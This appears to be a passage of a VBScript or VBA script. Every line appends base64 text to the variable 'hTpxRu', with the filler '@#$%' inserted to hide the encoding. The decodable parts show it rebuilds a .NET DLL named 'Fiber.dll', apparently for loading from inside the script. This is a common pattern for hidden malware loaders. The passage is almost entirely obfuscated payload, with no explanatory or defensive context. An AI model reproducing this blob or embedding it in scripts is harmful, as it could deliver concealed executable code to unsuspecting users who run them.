hTpxRu = hTpxRu & "BO@#$%EU@#$%V@#$%Bc@#$%EY@#$%cgBh@#$%G0@" 
hTpxRu = hTpxRu & "#$%ZQB3@#$%G8@#$%cgBr@#$%Fw@#$%dg@#$%0@#" 
hTpxRu = hTpxRu & "$%C4@#$%M@#$%@#$%u@#$%DM@#$%M@#$%@#$%z@#" 
hTpxRu = hTpxRu & "$%DE@#$%OQ@#$%@#$%@#$%y@#$%@#$%@#$%@#$%s" 
hTpxRu = hTpxRu & "i@#$%Hs@#$%M@#$%B9@#$%CI@#$%@#$%@#$%oRNq" 
hTpxRu = hTpxRu & "adjwJJmDFKUU9ESNM@#$%C@#$%E@#$%C@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%CLd6XFYZNOCJBC@#$%B@" 
hTpxRu = hTpxRu & "#$%Qge@#$%Q@#$%B@#$%FQCFldyYXBOb25FeGNlc" 
hTpxRu = hTpxRu & "HRpb25UaHJvd3MB@#$%y@#$%@#$%@#$%QgB@#$%@" 
hTpxRu = hTpxRu & "#$%I@#$%@#$%@#$%@#$%@#$%@#$%@#$%Ug@#$%QE" 
hTpxRu = hTpxRu & "RHQUB@#$%@#$%@#$%@#$%@#$%@#$%Qg@#$%QEOBC" 
hTpxRu = hTpxRu & "@#$%B@#$%QIp@#$%Q@#$%kNzkxNzJCMTMtRURCQS" 
hTpxRu = hTpxRu & "00MDk2LUI3MjUtOEU5MkI3MzBCMkJB@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%M@#$%Q@#$%HMS4wLj@#$%uM@#$%@#$%@#$%SQE" 
hTpxRu = hTpxRu & "@#$%Gi5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC44" 
hTpxRu = hTpxRu & "@#$%QBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRIuT" 
hTpxRu = hTpxRu & "kVUIEZyYW1ld29yay@#$%0LjgIsD9ffxHVCjoE@#" 
hTpxRu = hTpxRu & "$%@#$%EBH@#$%cGFRIc@#$%RIQBwYVEhwBEgwHBh" 
hTpxRu = hTpxRu & "USH@#$%ESYQcGFRIc@#$%RIY@#$%w@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%QMH@#$%QgGFRIc@#$%RIMBhUSH@#$%ESE@#$%YV" 
hTpxRu = hTpxRu & "EhwBEmEGFRIc@#$%RIYB@#$%@#$%@#$%Eh@#$%EI" 
hTpxRu = hTpxRu & "@#$%@#$%T@#$%@#$%Q@#$%@#$%BIMB@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%EmEE@#$%@#$%@#$%SG@#$%M@#$%@#$%@#$%IEC" 
hTpxRu = hTpxRu & "@#$%@#$%SE@#$%QI@#$%BIMB@#$%g@#$%EmEEC@#" 
hTpxRu = hTpxRu & "$%@#$%SG@#$%Qg@#$%QIc@#$%y@#$%@#$%C@#$%Q" 
hTpxRu = hTpxRu & "g@#$%BJl@#$%y@#$%@#$%DgcQ@#$%QEe@#$%B4@#" 
hTpxRu = hTpxRu & "$%B@#$%cBHg@#$%CHg@#$%FE@#$%E@#$%Hg@#$%E" 
hTpxRu = hTpxRu & "CgEe@#$%@#$%cw@#$%QEBEB4@#$%B@#$%@#$%BHB" 
hTpxRu = hTpxRu & "wF@#$%@#$%ICHBwE@#$%@#$%EIH@#$%Y@#$%@#$%" 
hTpxRu = hTpxRu & "RJlEXEHBhUSdQET@#$%@#$%QH@#$%RM@#$%BhUSH" 
hTpxRu = hTpxRu & "@#$%ET@#$%@#$%YVEnUBEw@#$%CEw@#$%ECgET@#" 
hTpxRu = hTpxRu & "$%@#$%Ug@#$%QET@#$%@#$%Qo@#$%BM@#$%@#$%g" 
hTpxRu = hTpxRu & "YcB@#$%@#$%@#$%EnkEI@#$%@#$%SfQYg@#$%gEO" 
hTpxRu = hTpxRu & "En0F@#$%@#$%@#$%SgIEEC@#$%@#$%SeQUI@#$%B" 
hTpxRu = hTpxRu & "K@#$%gQMGEiQE@#$%@#$%@#$%SJ@#$%g@#$%@#$%" 
hTpxRu = hTpxRu & "RK@#$%hRK@#$%hQQI@#$%BIk@#$%w@#$%@#$%H@#" 
hTpxRu = hTpxRu & "$%Y@#$%@#$%wEODg4lBxMODg4SgIkRgI0SgJEODg" 
hTpxRu = hTpxRu & "4SgJEcEoCVH@#$%4OHRwd@#$%hK@#$%lRK@#$%lQ" 
hTpxRu = hTpxRu & "sQ@#$%QECFRK@#$%oQEe@#$%@#$%MK@#$%Q4EBhK" 
hTpxRu = hTpxRu & "@#$%iQ0Q@#$%QICFRK@#$%oQEe@#$%B4@#$%BQoB" 
hTpxRu = hTpxRu & "EoCxBg@#$%B@#$%RG@#$%tQU@#$%@#$%BK@#$%vQ" 
hTpxRu = hTpxRu & "U@#$%@#$%gEcH@#$%Yg@#$%QESgL0E@#$%@#$%EO" 
hTpxRu = hTpxRu & "DgY@#$%@#$%xwcHBwFI@#$%IODg4F@#$%@#$%IcH" 
hTpxRu = hTpxRu & "BwEI@#$%EODgY@#$%@#$%wgcH@#$%IG@#$%@#$%M" 
hTpxRu = hTpxRu & "IDg4CBg@#$%BHBG@#$%yQY@#$%@#$%Q4RgMkF@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%RgI0H@#$%@#$%QcHBwcH@#$%c@#$%B@" 
hTpxRu = hTpxRu & "#$%4ODg4OBg@#$%CHQ4ODgc@#$%@#$%gEcEYDVBi" 
hTpxRu = hTpxRu & "@#$%B@#$%RG@#$%1QU@#$%@#$%g4ODgYg@#$%QES" 
hTpxRu = hTpxRu & "gJEE@#$%@#$%ECH@#$%Mg@#$%@#$%IG@#$%@#$%M" 
hTpxRu = hTpxRu & "cHBwCBy@#$%CEoCJDgIEI@#$%@#$%dDgY@#$%@#$" 
hTpxRu = hTpxRu & "%wEcHBwFI@#$%IBDhwF@#$%@#$%EdBQ4HI@#$%Ed" 
hTpxRu = hTpxRu & "EoCxDgY@#$%@#$%w4ODg4F@#$%@#$%IcDg4G@#$%" 
hTpxRu = hTpxRu & "@#$%EBEoCVCw@#$%HHBwSZRwcHBwcE@#$%@#$%HH" 
hTpxRu = hTpxRu & "BwSZQ4dHB0OHRJlHQIE@#$%@#$%EOH@#$%Y@#$%@" 
hTpxRu = hTpxRu & "#$%w4OHBwE@#$%@#$%ECDgY@#$%@#$%hwcEmUK@#" 
hTpxRu = hTpxRu & "$%@#$%YBHBJlHBwcH@#$%4@#$%BgEcEmUOHRwdDh" 
hTpxRu = hTpxRu & "0SZQw@#$%CBwcEmUcHBwcH@#$%IR@#$%@#$%gcHB" 
hTpxRu = hTpxRu & "JlDh0cHQ4dEmUd@#$%gIR@#$%@#$%oCDg4YG@#$%" 
hTpxRu = hTpxRu & "IJG@#$%4QETgQETQG@#$%@#$%ICGB0ICg@#$%F@#" 
hTpxRu = hTpxRu & "$%hgIE@#$%gIE@#$%gK@#$%@#$%UCG@#$%gdBQgQ" 
hTpxRu = hTpxRu & "C@#$%U@#$%@#$%ggYC@#$%g@#$%BQgYC@#$%gIC@" 
hTpxRu = hTpxRu & "#$%Q@#$%@#$%QgYBQ@#$%B@#$%h0FCgcH@#$%g4d" 
hTpxRu = hTpxRu & "DggOC@#$%gCBg4H@#$%@#$%QCHBwc@#$%iMHGgII" 
hTpxRu = hTpxRu & "DhE4ETQICB0IC@#$%gIC@#$%IICB0FC@#$%gIC@#" 
hTpxRu = hTpxRu & "$%gIHQUSgKUIC@#$%IGG@#$%U@#$%@#$%ggcC@#$" 
hTpxRu = hTpxRu & "%Qg@#$%QgIBQ@#$%CDg4cBQ@#$%BCBJlBg@#$%CC" 
hTpxRu = hTpxRu & "B0FC@#$%M@#$%@#$%@#$%gF@#$%@#$%IGH@#$%gG" 
hTpxRu = hTpxRu & "@#$%@#$%IGHQUIC@#$%@#$%F@#$%RwIH@#$%gID@" 
hTpxRu = hTpxRu & "#$%@#$%F@#$%RKBGQgSgRkIC@#$%Q@#$%@#$%RwI" 
hTpxRu = hTpxRu & "BQ@#$%BHQUIBg@#$%BEoClC@#$%IGCQIGC@#$%IG" 
hTpxRu = hTpxRu & "BhgB@#$%@#$%pNeVRlbXBsYXRlCDExLj@#$%uMC4" 
hTpxRu = hTpxRu & "w@#$%@#$%@#$%FI@#$%IBDg4I@#$%Q@#$%B@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%GI@#$%EBEYElB@#$%" 
hTpxRu = hTpxRu & "E@#$%@#$%@#$%@#$%Q@#$%Q@#$%LTXkuQ29tcHV0" 
hTpxRu = hTpxRu & "ZXI@#$%@#$%BMB@#$%@#$%5NeS5BcHBsaWNhdGlv" 
hTpxRu = hTpxRu & "bg@#$%@#$%D@#$%E@#$%B015LlVzZXI@#$%@#$%B" 
hTpxRu = hTpxRu & "MB@#$%@#$%5NeS5XZWJTZXJ2aWNlcw@#$%@#$%QQ" 
hTpxRu = hTpxRu & "E@#$%M1N5c3RlbS5SZXNvdXJjZXMuVG9vbHMuU3R" 
hTpxRu = hTpxRu & "yb25nbHlUeXBlZFJlc291cmNlQnVpbGRlcggxNy4" 
hTpxRu = hTpxRu & "wLj@#$%uM@#$%@#$%@#$%WQE@#$%S01pY3Jvc29m" 
hTpxRu = hTpxRu & "dC5WaXN1YWxTdHVkaW8uRWRpdG9ycy5TZXR0aW5n" 
hTpxRu = hTpxRu & "c0Rlc2lnbmVyLlNldHRpbmdzU2luZ2xlRmlsZUdl" 
hTpxRu = hTpxRu & "bmVyYXRvcggxNy4zLj@#$%uM@#$%@#$%@#$%E@#$" 
hTpxRu = hTpxRu & "%E@#$%C015LlNldHRpbmdz@#$%@#$%Bh@#$%Q@#$" 
hTpxRu = hTpxRu & "%0U3lzdGVtLldlYi5TZXJ2aWNlcy5Qcm90b2NvbH" 
hTpxRu = hTpxRu & "MuU29hcEh0dHBDbGllbnRQcm90b2NvbBJDcmVhdG" 
hTpxRu = hTpxRu & "VfX0luc3RhbmNlX18TRGlzcG9zZV9fSW5zdGFuY2" 
hTpxRu = hTpxRu & "VfXw@#$%@#$%@#$%@#$%cgB@#$%EODg4OJgE@#$%" 
hTpxRu = hTpxRu & "pznWV+TcCpKiPPeBE3YT5jEyEcyXGBS2OUjZ6HiM" 
hTpxRu = hTpxRu & "1+p+w9/U@#$%@#$%C0@#$%@#$%@#$%@#$%zsrvvg" 
hTpxRu = hTpxRu & "E@#$%@#$%@#$%CR@#$%@#$%@#$%@#$%bFN5c3Rlb" 
hTpxRu = hTpxRu & "S5SZXNvdXJjZXMuUmVzb3VyY2VSZWFkZXIsIG1zY" 
hTpxRu = hTpxRu & "29ybGliLCBWZXJzaW9uPTQuMC4wLj@#$%sIEN1bH" 
hTpxRu = hTpxRu & "R1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yj" 
hTpxRu = hTpxRu & "c3YTVjNTYxOTM0ZT@#$%4OSNTeXN0ZW0uUmVzb3V" 
hTpxRu = hTpxRu & "yY2VzLlJ1bnRpbWVSZXNvdXJjZVNld@#$%I@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%FBBRFBBRFC0@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%@#$%g@#$%@#$%@#$%C" 
hTpxRu = hTpxRu & "I@#$%@#$%@#$%C0bQ@#$%@#$%tE8@#$%@#$%FJTR" 
hTpxRu = hTpxRu & "FPh1CBeJoNsQKNmXCxEWWXo@#$%Q@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "EZpYmVyLnBkYg@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%CG4@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%Hm4@#$%@#$%@#$%@#$%g@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%@#$%@#$%BBu@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%BfQ29yRGxsTWFpbgB" 
hTpxRu = hTpxRu & "tc2NvcmVlLmRsb@#$%@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%/yU@#$%IE@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%Q@#$%Q@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%G@#$%@#$%@#$%g@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%Q@#$%B@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%M@#$%@#$%@#$%g@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%Q@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%S@#$%@#$%@#$%@#$%Fi@#$%@#$%@#$%D" 
hTpxRu = hTpxRu & "M@#$%g@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%DM@#$%jQ@#$%@#$%@#$%BW@#$%" 
hTpxRu = hTpxRu & "FM@#$%XwBW@#$%EU@#$%UgBT@#$%Ek@#$%TwBO@#" 
hTpxRu = hTpxRu & "$%F8@#$%SQBO@#$%EY@#$%Tw@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%vQTv/g@#$%@#$%@#$%Q@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%E@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%Q@#$%@#$%@#$%@#$%@#$%@#$%Pw@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%E@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%g@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%EQ@#$%@#$%@#$%@#$%B@#$%FY@#$%YQBy@#" 
hTpxRu = hTpxRu & "$%EY@#$%aQBs@#$%GU@#$%SQBu@#$%GY@#$%bw@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%J@#$%@#$%E@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%V@#$%By@#$%GE@#$%bgBz@#$%Gw@#$%Y" 
hTpxRu = hTpxRu & "QB0@#$%Gk@#$%bwBu@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%L@#$%EL@#$%I@#$%@#$%@#$%E@#" 
hTpxRu = hTpxRu & "$%UwB0@#$%HI@#$%aQBu@#$%Gc@#$%RgBp@#$%Gw" 
hTpxRu = hTpxRu & "@#$%ZQBJ@#$%G4@#$%ZgBv@#$%@#$%@#$%@#$%C@" 
hTpxRu = hTpxRu & "#$%I@#$%@#$%@#$%E@#$%M@#$%@#$%w@#$%D@#$%" 
hTpxRu = hTpxRu & "@#$%M@#$%@#$%w@#$%DQ@#$%Yg@#$%w@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%Gg@#$%B@#$%@#$%E@#$%QwBv@#$%G0@#$" 
hTpxRu = hTpxRu & "%bQBl@#$%G4@#$%d@#$%Bz@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%CI@#$%@#$%Q@#$%B@#$%EM" 
hTpxRu = hTpxRu & "@#$%bwBt@#$%H@#$%@#$%YQBu@#$%Hk@#$%TgBh@" 
hTpxRu = hTpxRu & "#$%G0@#$%ZQ@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%Co@#$%@#$%Q@#$%B@#$%EY@#$" 
hTpxRu = hTpxRu & "%aQBs@#$%GU@#$%R@#$%Bl@#$%HM@#$%YwBy@#$%" 
hTpxRu = hTpxRu & "Gk@#$%c@#$%B0@#$%Gk@#$%bwBu@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%M@#$%" 
hTpxRu = hTpxRu & "@#$%I@#$%@#$%E@#$%RgBp@#$%Gw@#$%ZQBW@#$%" 
hTpxRu = hTpxRu & "GU@#$%cgBz@#$%Gk@#$%bwBu@#$%@#$%@#$%@#$%" 
hTpxRu = hTpxRu & "@#$%@#$%@#$%x@#$%C4@#$%M@#$%@#$%u@#$%D@#" 
hTpxRu = hTpxRu & "$%@#$%Lg@#$%w@#$%@#$%@#$%@#$%N@#$%@#$%K@" 
hTpxRu = hTpxRu & "#$%@#$%E@#$%SQBu@#$%HQ@#$%ZQBy@#$%G4@#$%" 
hTpxRu = hTpxRu & "YQBs@#$%E4@#$%YQBt@#$%GU@#$%@#$%@#$%BG@#" 
hTpxRu = hTpxRu & "$%Gk@#$%YgBl@#$%HI@#$%LgBk@#$%Gw@#$%b@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%CY@#$%@#$%Q@#$%B@#$%Ew@#$%Z" 
hTpxRu = hTpxRu & "QBn@#$%GE@#$%b@#$%BD@#$%G8@#$%c@#$%B5@#$" 
hTpxRu = hTpxRu & "%HI@#$%aQBn@#$%Gg@#$%d@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%q@#$%@#$%E@#$%@#$%" 
hTpxRu = hTpxRu & "QBM@#$%GU@#$%ZwBh@#$%Gw@#$%V@#$%By@#$%GE" 
hTpxRu = hTpxRu & "@#$%Z@#$%Bl@#$%G0@#$%YQBy@#$%Gs@#$%cw@#$" 
hTpxRu = hTpxRu & "%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%Dw@#$%Cg@#$%B@#$%E8@#$%cgBp@#$%Gc@#$%aQ" 
hTpxRu = hTpxRu & "Bu@#$%GE@#$%b@#$%BG@#$%Gk@#$%b@#$%Bl@#$%" 
hTpxRu = hTpxRu & "G4@#$%YQBt@#$%GU@#$%@#$%@#$%BG@#$%Gk@#$%" 
hTpxRu = hTpxRu & "YgBl@#$%HI@#$%LgBk@#$%Gw@#$%b@#$%@#$%@#$" 
hTpxRu = hTpxRu & "%@#$%CI@#$%@#$%Q@#$%B@#$%F@#$%@#$%cgBv@#" 
hTpxRu = hTpxRu & "$%GQ@#$%dQBj@#$%HQ@#$%TgBh@#$%G0@#$%ZQ@#" 
hTpxRu = hTpxRu & "$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#" 
hTpxRu = hTpxRu & "$%DQ@#$%C@#$%@#$%B@#$%F@#$%@#$%cgBv@#$%G" 
hTpxRu = hTpxRu & "Q@#$%dQBj@#$%HQ@#$%VgBl@#$%HI@#$%cwBp@#$" 
hTpxRu = hTpxRu & "%G8@#$%bg@#$%@#$%@#$%DE@#$%Lg@#$%w@#$%C4" 
hTpxRu = hTpxRu & "@#$%M@#$%@#$%u@#$%D@#$%@#$%@#$%@#$%@#$%4" 
hTpxRu = hTpxRu & "@#$%@#$%g@#$%@#$%QBB@#$%HM@#$%cwBl@#$%G0" 
hTpxRu = hTpxRu & "@#$%YgBs@#$%Hk@#$%I@#$%BW@#$%GU@#$%cgBz@" 
hTpxRu = hTpxRu & "#$%Gk@#$%bwBu@#$%@#$%@#$%@#$%MQ@#$%u@#$%" 
hTpxRu = hTpxRu & "D@#$%@#$%Lg@#$%w@#$%C4@#$%M@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
hTpxRu = hTpxRu & "#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@#$%@" 
